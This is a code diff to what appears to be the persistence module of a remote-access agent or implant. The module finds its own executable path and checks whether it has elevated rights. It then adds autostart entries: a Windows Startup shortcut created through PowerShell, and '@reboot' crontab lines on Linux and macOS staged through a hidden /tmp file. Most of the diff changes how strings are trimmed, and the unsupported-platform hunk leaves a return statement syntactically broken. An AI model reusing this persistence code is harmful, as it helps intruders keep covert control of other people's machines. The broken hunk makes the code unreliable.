@@ -74,18 +74,19 @@ if is_windows {
     self_path.replace("\r\n", "");
     self_path.replace("\r",   "");
     self_path.replace("\n",   "");
-    self_path = self_path.trim();
+    self_path.trim();
 } else if is_linux {
     self_path = exec_os("readlink -f /proc/self/exe 2>/dev/null");
-    self_path = self_path.trim();
+    self_path.trim();
 } else {
     // macOS: exec_os child shell's $PPID == agent PID
     self_path = exec_os(
         "lsof -p $PPID 2>/dev/null | awk '$4==\"txt\" && $5==\"REG\" {print $NF}' | head -1"
     );
-    self_path = self_path.trim();
+    self_path.trim();
     if self_path.len() < 3 || self_path.contains("Error") {
-        self_path = exec_os("ps -p $PPID -o comm= 2>/dev/null").trim();
+        self_path = exec_os("ps -p $PPID -o comm= 2>/dev/null");
+        self_path.trim();
     }
 }
 
@@ -103,7 +104,9 @@ if is_windows {
     let groups = exec_os("whoami /groups 2>nul");
     is_elevated = groups.contains("S-1-16-12288");
 } else {
-    is_elevated = exec_os("id -u 2>/dev/null").trim() == "0";
+    let _uid = exec_os("id -u 2>/dev/null");
+    _uid.trim();
+    is_elevated = _uid == "0";
 }
 let priv_level = if is_elevated { "elevated" } else { "user" };
 print_log("[auto_persist] privilege=" + priv_level);
@@ -295,7 +298,7 @@ if is_windows {
         let startup = exec_os(
             "powershell -NoProfile -Command \"[Environment]::GetFolderPath('Startup')\""
         );
-        startup = startup.trim(); startup.replace("\r\n",""); startup.replace("\n","");
+        startup.trim(); startup.replace("\r\n",""); startup.replace("\n","");
         let lnk = startup + "\\" + LABEL + ".lnk";
         let ps_cmd =
             "$s=(New-Object -COM WScript.Shell).CreateShortcut('" + lnk +
@@ -357,8 +360,9 @@ if is_linux {
         let cron_cur = exec_os("crontab -l 2>/dev/null");
         if !cron_cur.contains(stable_path) {
             let entry    = "@reboot " + stable_path;
-            let new_cron = if cron_cur.trim().len() > 0 {
-                cron_cur.trim() + "\n" + entry + "\n"
+            cron_cur.trim();
+            let new_cron = if cron_cur.len() > 0 {
+                cron_cur + "\n" + entry + "\n"
             } else { entry + "\n" };
             let tmp = "/tmp/.cron_" + LABEL;
             internal_write(tmp, new_cron);
@@ -532,8 +536,9 @@ if is_macos {
         let cron_cur = exec_os("crontab -l 2>/dev/null");
         if !cron_cur.contains(stable_path) {
             let entry    = "@reboot " + stable_path;
-            let new_cron = if cron_cur.trim().len() > 0 {
-                cron_cur.trim() + "\n" + entry + "\n"
+            cron_cur.trim();
+            let new_cron = if cron_cur.len() > 0 {
+                cron_cur + "\n" + entry + "\n"
             } else { entry + "\n" };
             let tmp = "/tmp/.cron_" + LABEL;
             internal_write(tmp, new_cron);
@@ -593,7 +598,8 @@ if is_macos {
 // ── Unsupported platform ──────────────────────────────────────────────
 if !is_windows && !is_linux && !is_macos {
     return "{\"result\":\"error\",\"detail\":\"Unsupported platform: " +
-           uname.trim() + "\",\"platform\":\"unknown\"}";
+           uname.trim();
+           uname + "\",\"platform\":\"unknown\"}";
 }
 
 // ── Build output JSON ─────────────────────────────────────────────────
